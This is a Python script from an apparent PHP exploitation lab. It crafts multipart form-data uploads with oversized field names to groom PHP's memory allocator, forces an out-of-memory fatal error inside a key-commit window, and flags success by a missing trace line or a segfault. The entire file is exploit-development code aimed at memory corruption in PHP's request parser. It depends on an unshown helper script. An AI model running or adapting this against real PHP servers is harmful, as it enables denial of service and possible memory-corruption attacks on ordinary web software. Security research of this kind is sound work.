#!/usr/bin/env python3
"""oom34: jockey shift — prepend J flat-name parts (3500-char names -> one
persistent 4096-class page each) to shift start-of-cycle pool by -J bins.
Natural final cycle starts at pool=4 (refill dies). Prediction: J=2 -> pool=2
-> tmp1 ok, tmp2 ok, KEY asks -> fatal INSIDE post-commit window.
Detector: keycommit with no following keyok, or RC 139 (segv on teardown).
usage: oom34.py [jmax]
"""
import re
import sys

exec(open("/tmp/phplab/oom33.py").read().replace('if __name__ == "__main__":', 'if False:'))


def build_j(j):
    ps = []
    for n in range(j):
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="' + b"J" * 3498 +
                (b"%d" % n) + b'"\r\n\r\n')
        ps.append(head + b"v\r\n")
    ps.append(make_builder(3990)())
    return b"".join(ps)


def decode_j(j):
    rc, tr = run(build_j(j), LIMIT)
    commits = [(m.start(), m.group(2), m.group(3))
               for m in re.finditer(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", tr)]
    ok_positions = [m.start() for m in re.finditer(r"TRACE keyok", tr)]
    last = commits[-1] if commits else None
    key_death = last is not None and not any(p > last[0] for p in ok_positions)
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    rcnum = rc.replace("RC=", "")
    if key_death or rcnum == "139":
        i = tr.rfind("TRACE keycommit")
        print("j=%d rc=%s *** KEY DEATH elem=%s free=%s tried=%s ***" %
              (j, rcnum, last[1], last[2], tried[-1] if tried else "-"), flush=True)
        ctx = [l for l in tr[max(0, i - 700):i + 300].splitlines()
               if ("TRACE" in l or "tried" in l or "Allowed" in l)][-14:]
        print("\n".join(ctx))
        print("---")
        return True
    tag = "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive"
    print("j=%d rc=%s %s commits=%d oks=%d" %
          (j, rcnum, tag, len(commits), len(ok_positions)), flush=True)
    return False


if __name__ == "__main__":
    jmax = int(sys.argv[1]) if len(sys.argv) > 1 else 3
    for j in range(jmax + 1):
        if decode_j(j):
            break
